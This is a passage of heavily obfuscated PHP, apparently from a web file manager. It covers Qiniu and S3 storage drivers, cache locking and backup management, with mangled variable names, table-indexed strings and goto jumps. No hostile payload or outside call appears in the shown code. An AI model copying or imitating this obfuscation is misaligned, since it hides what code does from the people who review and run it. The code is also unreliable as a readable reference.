!0); $˜¨ØÖíí = array_to_keyvalue($şŠ†æ‡[$Œ­ÁÏÂû[93]], $Œ­ÁÏÂû[42]); foreach ($şŠ†æ‡[$Œ­ÁÏÂû[92]] as $ÀòèÍğÊ) { if (is_string($ÀòèÍğÊ)) { $˜¨ØÖíí[$ÀòèÍğÊ] = array($Œ­ÁÏÂû[86] => 0); } } return $this->listAllFiles($ı©‚´è¥, $˜¨ØÖíí); } private function fileList($ä¯˜¼ÓÔ, $´í³Şñ = '', $ŒèÉ³¸ = 0) { $Ëèšğ½ğ =& $_SERVER[ˆûùúÊ¯]; $ä¯˜¼ÓÔ = trim($ä¯˜¼ÓÔ, $Ëèšğ½ğ[8]); $‚ÔÆóË³ = empty($ä¯˜¼ÓÔ) && $ä¯˜¼ÓÔ !== $Ëèšğ½ğ[221] ? $Ëèšğ½ğ[12] : $ä¯˜¼ÓÔ . $Ëèšğ½ğ[8]; $œ«ğ´¯‘ = $Ëèšğ½ğ[12]; $éÕ½ÕÈŞ = 1000; $Æ¯†ÅÁ = $×òë»à‡ = array(); while (!0) { check_abort(); list($ñœ’·ËŸ, $ÀİÑàç) = $this->bucketManager->listFiles($this->bucket, $‚ÔÆóË³, $œ«ğ´¯‘, $éÕ½ÕÈŞ, $´í³Şñ); if ($ÀİÑàç) { break; } $œ«ğ´¯‘ = array_key_exists($Ëèšğ½ğ[1441], $ñœ’·ËŸ) ? $œ«ğ´¯‘ = $ñœ’·ËŸ[$Ëèšğ½ğ[1474]] : $Ëèšğ½ğ[12]; $”ñôÔÓ  = isset($ñœ’·ËŸ[$Ëèšğ½ğ[1475]]) ? $ñœ’·ËŸ[$Ëèšğ½ğ[1475]] : array(); $èûµÁ€² = isset($ñœ’·ËŸ[$Ëèšğ½ğ[1476]]) ? $ñœ’·ËŸ[$Ëèšğ½ğ[1476]] : array(); foreach ($”ñôÔÓ  as $ˆêÍ„˜Ã) { if ($ˆêÍ„˜Ã[$Ëèšğ½ğ[104]] == $‚ÔÆóË³) { continue; } $°Üşï•Š = $ˆêÍ„˜Ã[$Ëèšğ½ğ[104]]; $ñú‡« = $ˆêÍ„˜Ã[$Ëèšğ½ğ[1472]]; $ˆêÍ„˜Ã[$Ëèšğ½ğ[86]] = $ñú‡«; $·ÚÃìÃÉ = $ñú‡« == 0 && substr($°Üşï•Š, strlen($°Üşï•Š) - 1, 1) == $Ëèšğ½ğ[8] ? !0 : !1; $this->cacheMethodInfoSet($°Üşï•Š, $·ÚÃìÃÉ, $ˆêÍ„˜Ã); if ($·ÚÃìÃÉ) { $Æ¯†ÅÁ[] = $°Üşï•Š; continue; } $×òë»à‡[] = $ŒèÉ³¸ ? $ˆêÍ„˜Ã : $°Üşï•Š; } foreach ($èûµÁ€² as $°Üşï•Š) { if ($°Üşï•Š == $‚ÔÆóË³) { continue; } $Æ¯†ÅÁ[] = $°Üşï•Š; $this->cacheMethodInfoSet($°Üşï•Š, !0); } if ($œ«ğ´¯‘ === $Ëèšğ½ğ[12]) { break; } } $this->cacheMethodInfoSet($ä¯˜¼ÓÔ, !0); return array($Ëèšğ½ğ[92] => $Æ¯†ÅÁ, $Ëèšğ½ğ[93] => $×òë»à‡); } public function canRead($ÁÅªŞ‚…) { return $this->exist($ÁÅªŞ‚…) ? !0 : !1; } public function canWrite($ìñ•˜Å²) { return $this->exist($ìñ•˜Å²) ? !0 : !1; } public function getContent($Ü¯¬Ì“ğ) { return $this->fileSubstr($Ü¯¬Ì“ğ, 0, -1); } public function setContent($Ï¸²µÃç, $•·ùÃÓÑ = '') { $ó„ÌØó  = $this->tempFile($this->pathThis($Ï¸²µÃç)); file_put_contents($ó„ÌØó , $•·ùÃÓÑ); if ($this->upload($Ï¸²µÃç, $ó„ÌØó )) { $this->tempFileRemve($ó„ÌØó ); return !0; } return !1; } public function refreshUrls($Ç˜èı¬©) { $“´™ êØ =& $_SERVER[ˆûùúÊ¯]; $£´Ş§ÍÙ = array(); if (is_array($Ç˜èı¬©)) { foreach ($Ç˜èı¬© as $ÍØ³‡·ğ) { $£´Ş§ÍÙ[] = $this->link($ÍØ³‡·ğ); } } else { $£´Ş§ÍÙ[] = $this->link($Ç˜èı¬©); } $Æªº€—ø = new Qiniu\Cdn\CdnManager($this->auth); list($ƒÓ¸ Ì, $©ûŒ°Èğ) = $Æªº€—ø->refreshUrls($£´Ş§ÍÙ); if ($©ûŒ°Èğ) { return !1; } return $ƒÓ¸ Ì[$“´™ êØ[1243]] == $“´™ êØ[819] ? !0 : !1; } public function fileSubstr($¯ç¸îÖ¿, $š‰¿¨ã¹, $áı°™Éä) { $„ÆƒóíÅ =& $_SERVER[ˆûùúÊ¯]; if (!($”¤ËŸ¸â = $this->link($¯ç¸îÖ¿))) { return !1; } $¢‰×ää = !1; if ($áı°™Éä > 0) { $©Ä§ö®í = $š‰¿¨ã¹ + $áı°™Éä - 1; $¢‰×ää = array($„ÆƒóíÅ[1477] . $š‰¿¨ã¹ . $„ÆƒóíÅ[438] . $©Ä§ö®í); } $Ï ¬’Äö = url_request($”¤ËŸ¸â, $„ÆƒóíÅ[254], !1, $¢‰×ää); return $Ï ¬’Äö[$„ÆƒóíÅ[810]] ? $Ï ¬’Äö[$„ÆƒóíÅ[1263]] : !1; } public function upload($è¶ó­ŸŸ, $«’ßÙ³Â, $õÙ—È¹¬ = false, $µ•ï¤´ = REPEAT_REPLACE) { $×¯ßÑ°Ş = new Qiniu\Storage\UploadManager(); $Í†ÛÎÌŠ = $this->auth->uploadToken($this->bucket, $è¶ó­ŸŸ); $ÌĞõ ‰¾ = get_file_mime(get_path_ext($«’ßÙ³Â)); list($¦¹«÷é, $¯¨îââù) = $×¯ßÑ°Ş->putFile($Í†ÛÎÌŠ, $è¶ó­ŸŸ, $«’ßÙ³Â, null, $ÌĞõ ‰¾); return $¯¨îââù ? !1 : $this->getPathOuter($è¶ó­ŸŸ); } public function uploadFormData($äÈÙÓøû, $Àßñéïæ = 3600) { return $this->uploadToken($äÈÙÓøû, $Àßñéïæ); } public function multiUploadFormData($Ê¯ÂÁ‡±, $¾¼Î‘­ñ = 3600) { return $this->uploadToken($Ê¯ÂÁ‡±, $¾¼Î‘­ñ); } private function uploadToken($Ã‰Áûƒ, $ğáå½Û‹ = 3600) { $¬úÉ™›Ğ =& $_SERVER[ˆûùúÊ¯]; $ñÍåÅ—ä = $ğáå½Û‹; $å†²´© = array($¬úÉ™›Ğ[1478] => $¬úÉ™›Ğ[1479]); $ ›·¾áø = $Ã‰Áûƒ; $´è×±Ç = $this->auth->uploadToken($this->bucket, $ ›·¾áø, $ñÍåÅ—ä, $å†²´©, !0); $İ Õø´Ó = empty($this->region) || $this->region == $¬úÉ™›Ğ[1480] ? $¬úÉ™›Ğ[12] : $¬úÉ™›Ğ[438] . $this->region; $ó¦âÒ×´ = http_type() . "\x3a\x2f\x2f\x75\160\154\x6f\x61\144{$İ Õø´Ó}\56\161\x69\x6e\x69\165\160\56\143\x6f\x6d\57"; return array($¬úÉ™›Ğ[1481] => $´è×±Ç, $¬úÉ™›Ğ[1482] => $ó¦âÒ×´); } public function download($æØ Œïú, $Í¹ÊéÅ) { $û÷Äü¹ = IO::getPathInner(IO::mkfile($Í¹ÊéÅ)); if (!($‚èíÆñÇ = $this->link($æØ Œïú))) { return !1; } $£¬®–´Ô = 0; $ÌğÏ¥™ù = 1024 * 200; $˜ºÔƒÊÔ = fopen($û÷Äü¹, $_SERVER[ˆûùúÊ¯][1483]); while (!0) { $Ò»–àˆ® = $this->fileSubstr($æØ Œïú, $£¬®–´Ô, $ÌğÏ¥™ù); if ($Ò»–àˆ® === !1) { return !1; } fwrite($˜ºÔƒÊÔ, $Ò»–àˆ®); $£¬®–´Ô += $ÌğÏ¥™ù; if (strlen($Ò»–àˆ®) < $ÌğÏ¥™ù) { break; } } fclose($˜ºÔƒÊÔ); return $Í¹ÊéÅ; } public function link($™¯ºÒæ¯, $¦Úˆ›³© = '') { if (!$this->isFile($™¯ºÒæ¯)) { return !1; } $ĞÓö’ñ² = $this->getHost() . $_SERVER[ˆûùúÊ¯][8] . $this->pathEncode($™¯ºÒæ¯) . $¦Úˆ›³©; return $this->auth->privateDownloadUrl($ĞÓö’ñ², 3600 * 12); } public function fileOut($†ã‹Á¿Ş, $Œƒ«éÌÚ = false, $Õ›»¯òµ = false, $ëüÖºóã = '') { $É±Œ¨ïØ =& $_SERVER[ˆûùúÊ¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($†ã‹Á¿Ş, $Œƒ«éÌÚ, $Õ›»¯òµ, $ëüÖºóã); } if (!$Õ›»¯òµ) { $Õ›»¯òµ = $this->pathThis($†ã‹Á¿Ş); } $­×¾ğ‡ = $Œƒ«éÌÚ ? $É±Œ¨ïØ[1484] . rawurlencode($Õ›»¯òµ) : $É±Œ¨ïØ[12]; $ÑøÕ­¬À = $this->link($†ã‹Á¿Ş, $­×¾ğ‡); $this->fileOutLink($ÑøÕ­¬À); } public function fileOutServer($¢¦®¿Ş§, $ÃÀßùï = false, $´¥ÎÓÃË = false, $ÇÊşØ¨” = '') { parent::fileOut($¢¦®¿Ş§, $ÃÀßùï, $´¥ÎÓÃË, $ÇÊşØ¨”); } public function fileOutImage($·‚ú´”, $œõ¤“ÚØ = 250) { $§‹´ªÜÛ = $this->link($·‚ú´”, $_SERVER[ˆûùúÊ¯][1485] . $œõ¤“ÚØ); $this->fileOutLink($§‹´ªÜÛ); } public function fileOutImageServer($ôÌœœ¥ù, $È‚ÛøÇÁ = 250) { parent::fileOutImage($ôÌœœ¥ù, $È‚ÛøÇÁ); } public function hashMd5($äİ£òúƒ) { $¤Ğ‘Ö¸Ã =& $_SERVER[ˆûùúÊ¯]; $›æøãàË = $this->objectMeta($äİ£òúƒ); return isset($›æøãàË[$¤Ğ‘Ö¸Ã[237]]) ? $›æøãàË[$¤Ğ‘Ö¸Ã[237]] : !1; $Ò÷…£Çˆ = $this->link($äİ£òúƒ, $¤Ğ‘Ö¸Ã[1486]); } public function size($áñŒ²é˜) { $ûŒ»Áã = $this->objectMeta($áñŒ²é˜); return $ûŒ»Áã ? $ûŒ»Áã[$_SERVER[ˆûùúÊ¯][86]] : 0; } public function info($÷ÍÔéÕõ) { if ($this->isFolder($÷ÍÔéÕõ)) { return $this->folderInfo($÷ÍÔéÕõ); } else { if ($this->isFile($÷ÍÔéÕõ)) { return $this->fileInfo($÷ÍÔéÕõ); } } return !1; } public function exist($«ŸÂ×Ø¨) { return $this->isFile($«ŸÂ×Ø¨) || $this->isFolder($«ŸÂ×Ø¨); } public function isFile($óÁÀ‰) { return !$this->isFolder($óÁÀ‰) && $this->objectMeta($óÁÀ‰); } public function isFolder($¦îİ‘¨È) { return $this->cacheMethod($_SERVER[ˆûùúÊ¯][175], $¦îİ‘¨È); } protected function objectMeta($ş¯ç¼Ùœ) { return $this->cacheMethod($_SERVER[ˆûùúÊ¯][177], $ş¯ç¼Ùœ); } protected function _objectMeta($ÕïŠëÄ) { $§ñÒğ =& $_SERVER[ˆûùúÊ¯]; list($©ÇÛÍæå, $˜åœàù) = $this->bucketManager->stat($this->bucket, $ÕïŠëÄ); if ($©ÇÛÍæå) { $©ÇÛÍæå[$§ñÒğ[86]] = intval($©ÇÛÍæå[$§ñÒğ[1472]]); } return $©ÇÛÍæå; } protected function _isFolder($áªÌ°±Œ) { $ù×Û“ =& $_SERVER[ˆûùúÊ¯]; if ($áªÌ°±Œ == $ù×Û“[12] || $áªÌ°±Œ == $ù×Û“[8]) { return !0; } list($Â€ÖÏâ¹, $¼€„²Ø”) = $this->bucketManager->listFiles($this->bucket, trim($áªÌ°±Œ, $ù×Û“[8]) . $ù×Û“[8], $ù×Û“[12], 1, $ù×Û“[8]); return !empty($Â€ÖÏâ¹[$ù×Û“[1475]]) || !empty($Â€ÖÏâ¹[$ù×Û“[1476]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($î«šĞ¹ì) { parent::__construct($î«šĞ¹ì); } public function uploadFormData($Õ‘ùüÄé, $‰Ïì†â = 3600) { $¤á×Óöö =& $_SERVER[ˆûùúÊ¯]; $Ù·ÃŠã÷ = $¤á×Óöö[222]; $öœ¨¸†î = $¤á×Óöö[261]; $ĞÈÑÅ¬› = $¤á×Óöö[72]; $å»î®— = gmdate($¤á×Óöö[262]); $¤¨ÄÛâ— = gmdate($¤á×Óöö[263]); $Æ§²ã­… = $¤á×Óöö[264]; $ë´õ‡ˆ = $‰Ïì†â . $¤á×Óöö[12]; $ê»ƒŒâÓ = $¤á×Óöö[265]; $•·€ÊÙ = array($this->accessKey, $¤¨ÄÛâ—, $this->region, $ĞÈÑÅ¬›, $Æ§²ã­…); $Ğ†‚îç = implode($¤á×Óöö[8], $•·€ÊÙ); $åŠêÉÎ = array($¤á×Óöö[266] => gmdate($¤á×Óöö[1385], strtotime($¤á×Óöö[268])), $¤á×Óöö[269] => array(array($¤á×Óöö[270] => $this->bucket), array($¤á×Óöö[271] => $Ù·ÃŠã÷), array($¤á×Óöö[272], $¤á×Óöö[273], $¤á×Óöö[12]), array($¤á×Óöö[272], $¤á×Óöö[274], $¤á×Óöö[12]), array($¤á×Óöö[272], $¤á×Óöö[275], $¤á×Óöö[12]), array($¤á×Óöö[276] => $ê»ƒŒâÓ), array($¤á×Óöö[277] => $Ğ†‚îç), array($¤á×Óöö[278] => $öœ¨¸†î), array($¤á×Óöö[279] => $å»î®—), array($¤á×Óöö[280] => $ë´õ‡ˆ))); $‹ÖÚ¹ñ­ = base64_encode(json_encode($åŠêÉÎ)); $Ä°Ê“Ô = hash_hmac($¤á×Óöö[281], $¤¨ÄÛâ—, $¤á×Óöö[282] . $this->secret, !0); $€³È©„ = hash_hmac($¤á×Óöö[281], $this->region, $Ä°Ê“Ô, !0); $™Ôú… = hash_hmac($¤á×Óöö[281], $ĞÈÑÅ¬›, $€³È©„, !0); $É©¹µª‘ = hash_hmac($¤á×Óöö[281], $Æ§²ã­…, $™Ôú…, !0); $‡ÔôÊà = hash_hmac($¤á×Óöö[281], $‹ÖÚ¹ñ­, $É©¹µª‘); $ş»ÏÀóã = array($¤á×Óöö[239] => $¤á×Óöö[12], $¤á×Óöö[283] => $¤á×Óöö[12], $¤á×Óöö[271] => $Ù·ÃŠã÷, $¤á×Óöö[276] => $ê»ƒŒâÓ, $¤á×Óöö[284] => $‹ÖÚ¹ñ­, $¤á×Óöö[285] => $Ğ†‚îç, $¤á×Óöö[286] => $öœ¨¸†î, $¤á×Óöö[287] => $å»î®—, $¤á×Óöö[288] => $ë´õ‡ˆ, $¤á×Óöö[289] => $‡ÔôÊà, $¤á×Óöö[205] => $this->getHost()); return $ş»ÏÀóã; } public function multiUploadFormData($¿®ÇÇè±, $ïŞÓäİö = 3600) { $Ó¥š‘¤î =& $_SERVER[ˆûùúÊ¯]; $èÎß¤Éñ = gmdate($Ó¥š‘¤î[1487]); $–Ñàù½Œ = array(); $§«Ù­®³ = $this->client->getUploadId($this->bucket, $¿®ÇÇè±, $–Ñàù½Œ); if (!$§«Ù­®³) { return !1; } return array($Ó¥š‘¤î[247] => $§«Ù­®³, $Ó¥š‘¤î[205] => $this->getHost() . $Ó¥š‘¤î[8] . $this->pathEncode($¿®ÇÇè±), $Ó¥š‘¤î[248] => $èÎß¤Éñ, $Ó¥š‘¤î[104] => $¿®ÇÇè±); } public function multiUploadAuthData($†Š¼¾ğÒ, $ò·¸­ï¨ = array()) { $½ı”Êãú =& $_SERVER[ˆûùúÊ¯]; $Ãşœ¼ÄÆ = isset($ò·¸­ï¨[$½ı”Êãú[184]]) ? $ò·¸­ï¨[$½ı”Êãú[184]] : $½ı”Êãú[12]; $œ‹üôÚ‚ = $ò·¸­ï¨[$½ı”Êãú[104]]; unset($ò·¸­ï¨[$½ı”Êãú[104]]); if (isset($ò·¸­ï¨[$½ı”Êãú[249]])) { return $this->listUploadParts($œ‹üôÚ‚, $ò·¸­ï¨); } $‹ğâ£Ñ€ = array(); if (isset($ò·¸­ï¨[$½ı”Êãú[1488]])) { $‹ğâ£Ñ€[$½ı”Êãú[1489]] = $ò·¸­ï¨[$½ı”Êãú[1488]]; } $öªçúñ¢ = explode($½ı”Êãú[207], $this->getHost()); $¯¬¿°– = array($½ı”Êãú[1490] => $öªçúñ¢[1], $½ı”Êãú[1491] => $½ı”Êãú[12], $½ı”Êãú[239] => $½ı”Êãú[130], $½ı”Êãú[283] => $ò·¸­ï¨[$½ı”Êãú[86]]); $ğÓÃ—Ìè = $½ı”Êãú[252]; $Æò«Ğ«´ = $½ı”Êãú[8] . $this->pathEncode($œ‹üôÚ‚) . $Ãşœ¼ÄÆ; $èŸıÆ’Õ = $this->client->__getSignatureV4($‹ğâ£Ñ€, $¯¬¿°–, $ğÓÃ—Ìè, $Æò«Ğ«´); if (strpos($Ãşœ¼ÄÆ, $½ı”Êãú[251]) === 0) { if (isset($‹ğâ£Ñ€[$½ı”Êãú[1489]])) { $™ì‹¤ô = $‹ğâ£Ñ€[$½ı”Êãú[1489]]; } else { if (isset($èŸıÆ’Õ[$½ı”Êãú[1489]])) { $™ì‹¤ô = $èŸıÆ’Õ[$½ı”Êãú[1489]]; } else { $™ì‹¤ô = hash($½ı”Êãú[281], $½ı”Êãú[12]); } } return array($½ı”Êãú[257] => $èŸıÆ’Õ[$½ı”Êãú[257]], $½ı”Êãú[1489] => $™ì‹¤ô, $½ı”Êãú[248] => $èŸıÆ’Õ[$½ı”Êãú[1492]]); } return $èŸıÆ’Õ[$½ı”Êãú[257]]; } public function listUploadParts($¾ÈàêœÑ, $µ‡Ãàˆ = array()) { $÷ˆİ¦›¦ =& $_SERVER[ˆûùúÊ¯]; $µŞ©«ğ  = str_replace($÷ˆİ¦›¦[258], $÷ˆİ¦›¦[12], $µ‡Ãàˆ[$÷ˆİ¦›¦[184]]); $¾†ğı£ = $this->client->listParts($this->bucket, $¾ÈàêœÑ, $µŞ©«ğ ); if (!$¾†ğı£) { return !1; } $ÑŞú÷õ = $÷ˆİ¦›¦[1493]; foreach ($¾†ğı£ as $ÉÀîà÷) { $ÑŞú÷õ .= $÷ˆİ¦›¦[1494] . "\74\120\x61\x72\164\116\x75\155\142\x65\x72\x3e{$ÉÀîà÷[$÷ˆİ¦›¦[1449]]}\x3c\x2f\x50\141\x72\164\x4e\165\155\x62\145\x72\x3e\xa" . "\74\105\x54\141\x67\76{$ÉÀîà÷[$÷ˆİ¦›¦[1450]]}\x3c\x2f\x45\124\x61\x67\76\12" . $÷ˆİ¦›¦[1495]; } $ÑŞú÷õ .= $÷ˆİ¦›¦[1496]; $Í‹´Äñ¯ = array(); $®À¨¬ã = explode($÷ˆİ¦›¦[207], $this->getHost()); $¡‰÷•Òœ = array($÷ˆİ¦›¦[1490] => $®À¨¬ã[1], $÷ˆİ¦›¦[239] => $÷ˆİ¦›¦[130], $÷ˆİ¦›¦[283] => strlen($ÑŞú÷õ)); $¨äçßØ = $÷ˆİ¦›¦[250]; $×ˆğï¾Û = $÷ˆİ¦›¦[8] . $this->pathEncode($¾ÈàêœÑ) . $µ‡Ãàˆ[$÷ˆİ¦›¦[184]]; $Ò“†íÂ§ = $this->client->__getSignatureV4($Í‹´Äñ¯, $¡‰÷•Òœ, $¨äçßØ, $×ˆğï¾Û, $ÑŞú÷õ); return array($÷ˆİ¦›¦[257] => $Ò“†íÂ§[$÷ˆİ¦›¦[257]], $÷ˆİ¦›¦[248] => $Ò“†íÂ§[$÷ˆİ¦›¦[1492]], $÷ˆİ¦›¦[259] => $¾†ğı£, $÷ˆİ¦›¦[1489] => $Ò“†íÂ§[$÷ˆİ¦›¦[1489]]); } public function link($Ç¶Øİ¶œ, $Áôœ…˜‘ = array()) { return parent::link($Ç¶Øİ¶œ, $Áôœ…˜‘); } public function fileOut($â§¯Œê, $Úí‰öŒ = false, $Ö´¼•µô = false, $ò©ü¥ú« = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ˆûùúÊ¯][1497])) { return parent::fileOutServer($â§¯Œê, $Úí‰öŒ, $Ö´¼•µô, $ò©ü¥ú«); } parent::fileOut($â§¯Œê, $Úí‰öŒ, $Ö´¼•µô, $ò©ü¥ú«); } public function fileOutImage($ï©è¿ƒò, $ƒ¤Î¦–´ = 250) { if (strstr($this->endpoint, $_SERVER[ˆûùúÊ¯][1497])) { return parent::fileOutImageServer($ï©è¿ƒò, $ƒ¤Î¦–´); } parent::fileOutImage($ï©è¿ƒò, $ƒ¤Î¦–´); } public function fileOutLink($“›ê»Š) { $•â÷¾„Ú =& $_SERVER[ˆûùúÊ¯]; if (substr($“›ê»Š, 0, 7) == $•â÷¾„Ú[1391]) { $“›ê»Š = $•â÷¾„Ú[1392] . substr($“›ê»Š, 7); } header($•â÷¾„Ú[171] . $“›ê»Š); die; } public function getHost() { $–äô™È€ =& $_SERVER[ˆûùúÊ¯]; $ƒÍÏ¦Ë§ = str_rtrim(parent::getHost(), $–äô™È€[8] . $this->bucket); $ƒÍÏ¦Ë§ = explode($–äô™È€[207], $ƒÍÏ¦Ë§); return $ƒÍÏ¦Ë§[0] . $–äô™È€[207] . $this->bucket . $–äô™È€[10] . $ƒÍÏ¦Ë§[1]; } } goto c½ŠŞÍ”Úª; déÙÕ–£Œ’: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Ãùå¾şì =& $_SERVER[ˆûùúÊ¯]; $¼ÄŒÊúå = $GLOBALS[$Ãùå¾şì[6]][$Ãùå¾şì[401]]; self::$cachePath = $¼ÄŒÊúå[$Ãùå¾şì[223]][$Ãùå¾şì[94]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ªşìÓ—Ë, $Œ€óåï» = 0) { $”À¤µß¶ =& $_SERVER[ˆûùúÊ¯]; $–—©—î = microtime(!0); $ï¦Õù†² = $–—©—î + $Œ€óåï» + 0.0001; $Ş•ìË¿ = rtrim(self::$cachePath, $”À¤µß¶[8]) . $”À¤µß¶[924] . md5($ªşìÓ—Ë) . $”À¤µß¶[921]; if (file_exists($Ş•ìË¿) && filemtime($Ş•ìË¿) && filemtime($Ş•ìË¿) < time() - 10) { @unlink($Ş•ìË¿); } do { if (file_exists($Ş•ìË¿)) { cacheLockWait(); continue; } $ÎÈ¥‰¨§ = fopen($Ş•ìË¿, $”À¤µß¶[925]); if (!$ÎÈ¥‰¨§) { return !1; } $õÓÆÉá = flock($ÎÈ¥‰¨§, LOCK_EX | LOCK_NB); self::$caches[$ªşìÓ—Ë] = array($”À¤µß¶[926] => $ÎÈ¥‰¨§, $”À¤µß¶[223] => $Ş•ìË¿); fwrite($ÎÈ¥‰¨§, $ï¦Õù†²); clearstatcache(); if ($ÎÈ¥‰¨§ && $õÓÆÉá) { return !0; } cacheLockWait(); } while (microtime(!0) < $ï¦Õù†²); $this->unlock($ªşìÓ—Ë); return !1; } public function lockGet($‘Ê¤áİÎ) { $¾Ö‹œÖ =& $_SERVER[ˆûùúÊ¯]; $‰ŞìÆ— = rtrim(self::$cachePath, $¾Ö‹œÖ[8]) . $¾Ö‹œÖ[924] . md5($‘Ê¤áİÎ) . $¾Ö‹œÖ[921]; return file_exists($‰ŞìÆ—); } public function unlock($ŠºÚ…–) { $îÖºßÖÅ =& $_SERVER[ˆûùúÊ¯]; $Í¾±£ä = self::$caches[$ŠºÚ…–]; if (!$Í¾±£ä) { return; } @flock($Í¾±£ä[$îÖºßÖÅ[926]], LOCK_UN); @fclose($Í¾±£ä[$îÖºßÖÅ[926]]); @unlink($Í¾±£ä[$îÖºßÖÅ[223]]); unset(self::$caches[$ŠºÚ…–]); } } class CacheLockRedis { public function lock($ÅâªŒô, $ß™ïˆ = 10) { $•”“† = Cache::init(); $ŞÎ´úã» = microtime(!0) + $ß™ïˆ; while (microtime(!0) < $ŞÎ´úã») { $²¬¶õ«­ = $•”“†->get($ÅâªŒô); if (!$²¬¶õ«­) { $î¨¸ßÆí = $•”“†->setLock($ÅâªŒô, $ŞÎ´úã», $ß™ïˆ); if ($î¨¸ßÆí) { return !0; } } else { if ($²¬¶õ«­ < microtime(!0)) { $•”“†->set($ÅâªŒô, $ŞÎ´úã», $ß™ïˆ * 2); if ($•”“†->get($ÅâªŒô) === $²¬¶õ«­) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Üî®‹£š) { return Cache::init()->get($Üî®‹£š); } public function unlock($İ³ñÉÇ…) { return Cache::init()->remove($İ³ñÉÇ…); } } goto D÷Ó§ò¤×ğ; fê‰ÚˆÍäƒ: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\x62\141\143\x6b\165\160\x4c\x69\163\x74"; public $field = array("\x69\157", "\156\x61\x6d\x65", "\163\164\141\164\x75\x73", "\x63\x6f\156\164\145\156\x74", "\155\x61\x6e\x75\x61\x6c", "\x72\145\163\165\x6c\164", "\164\151\155\145\x46\162\x6f\155", "\164\151\155\145\x54\157"); public function config() { $§Ğ¹—«Û =& $_SERVER[ˆûùúÊ¯]; $Ş±£¹„— = Model($§Ğ¹—«Û[830])->get($§Ğ¹—«Û[840]); $Ş±£¹„— = json_decode($Ş±£¹„—, !0); $Ş±£¹„— = is_array($Ş±£¹„—) ? $Ş±£¹„— : array(); if (!isset($Ş±£¹„—[$§Ğ¹—«Û[814]])) { $Ş±£¹„—[$§Ğ¹—«Û[814]] = $§Ğ¹—«Û[98]; } unset($Ş±£¹„—[$§Ğ¹—«Û[1674]]); Action($§Ğ¹—«Û[1921])->taskInit(); Model($§Ğ¹—«Û[1673])->cacheClear(); $ŒË™­Å = $§Ğ¹—«Û[1922]; $û„È½ğş = Model($§Ğ¹—«Û[1923])->findByKey($§Ğ¹—«Û[1692], $ŒË™­Å); if (!$û„È½ğş) { $û„È½ğş = array(); } if (isset($û„È½ğş[$§Ğ¹—«Û[203]])) { $û„È½ğş[$§Ğ¹—«Û[203]] = json_decode($û„È½ğş[$§Ğ¹—«Û[203]], !0); } if (isset($Ş±£¹„—[$§Ğ¹—«Û[203]])) { $û„È½ğş[$§Ğ¹—«Û[203]][$§Ğ¹—«Û[1677]] = $Ş±£¹„—[$§Ğ¹—«Û[203]]; unset($Ş±£¹„—[$§Ğ¹—«Û[203]]); } return array_merge($û„È½ğş, $Ş±£¹„—); } public function listData($‰Ğİ²öİ = false, $Â°Ò“åå = "\155\x6f\144\x69\x66\171\x54\151\x6d\x65", $ƒü÷°†Ì = false) { return parent::listData($‰Ğİ²öİ, $Â°Ò“åå, !0); } public function lastItem() { $å“¼àß = $this->listData(); return !empty($å“¼àß[0]) ? $å“¼àß[0] : null; } public function kill($ıæî·¦) { $¢÷ÁÂÏ» =& $_SERVER[ˆûùúÊ¯]; $Œ¶…¥ş¾ = $this->listData($ıæî·¦); if (!$Œ¶…¥ş¾ || empty($Œ¶…¥ş¾[$¢÷ÁÂÏ»[42]])) { return !0; } Task::kill($¢÷ÁÂÏ»[839]); Task::kill($¢÷ÁÂÏ»[860]); Task::kill($¢÷ÁÂÏ»[869]); $½»ŒÊ¸ = $Œ¶…¥ş¾[$¢÷ÁÂÏ»[42]]; $îÑãºèñ = TEMP_FILES . $¢÷ÁÂÏ»[838] . $½»ŒÊ¸ . $¢÷ÁÂÏ»[8]; IO::remove($îÑãºèñ, !1); return $this->remove($ıæî·¦); } public function remove($İ§±ÃŞŒ) { $şİàïµâ = $this->listData($İ§±ÃŞŒ); if (!$şİàïµâ) { return !0; } return $this->backupRemove($şİàïµâ); } private function backupRemove($õË×Ø¹ø) { parent::remove($õË×Ø¹ø[$_SERVER[ˆûùúÊ¯][451]]); $æÚÀ§¨ş = $this->backupPath($õË×Ø¹ø); IO::remove($æÚÀ§¨ş, !1); return !0; } private function backupPath($æ’É€Á‚) { $¦Å‡Æš× =& $_SERVER[ˆûùúÊ¯]; $§€ì¶ëİ = $æ’É€Á‚[$¦Å‡Æš×[42]]; $µÈæªãË = Model($¦Å‡Æš×[830])->get($¦Å‡Æš×[831]); $¿¦½‰Ç¢ = substr(md5($¦Å‡Æš×[832] . $µÈæªãË . $§€ì¶ëİ), 0, 8); return "\173\151\x6f\x3a{$æ’É€Á‚[$¦Å‡Æš×[811]]}\x7d\57\144\x61\164\x61\x62\x61\x73\145\x2f\x62\x61\x63\x6b\165\x70\57" . $§€ì¶ëİ . $¦Å‡Æš×[11] . $¿¦½‰Ç¢; } public function start() { $™Ñ£Ïşù =& $_SERVER[ˆûùúÊ¯]; if ($GLOBALS[$™Ñ£Ïşù[6]][$™Ñ£Ïşù[99]][$™Ñ£Ïşù[1924]] != $™Ñ£Ïşù[98]) { return !0; } $ï•¸®ŠÜ = $this->config(); if (!$ï•¸®ŠÜ || $ï•¸®ŠÜ[$™Ñ£Ïşù[1674]] != $™Ñ£Ïşù[98]) { return !1; } $À»íÆš÷ = $this->process(); foreach ($À»íÆš÷ as $ÌâÁïŒ‚) { if ($ÌâÁïŒ‚) { return Task::restart($ÌâÁïŒ‚[$™Ñ£Ïşù[451]]); } } $ê‡òÆ‘Ü = new Backup(); $–œŸäó÷ = $ê‡òÆ‘Ü->db(); if ($–œŸäó÷) { $–œŸäó÷ = $ê‡òÆ‘Ü->dbFile(); if ($–œŸäó÷ && $ï•¸®ŠÜ[$™Ñ£Ïşù[814]] == $™Ñ£Ïşù[221]) { $–œŸäó÷ = $ê‡òÆ‘Ü->file(); } } Backup::set(array($™Ñ£Ïşù[810] => 1, $™Ñ£Ïşù[821] => time())); return !0; } public function process() { $»Ö±®¤„ =& $_SERVER[ˆûùúÊ¯]; $š·Üöê§ = array($»Ö±®¤„[817] => Task::get($»Ö±®¤„[839]), $»Ö±®¤„[822] => Task::get($»Ö±®¤„[860]), 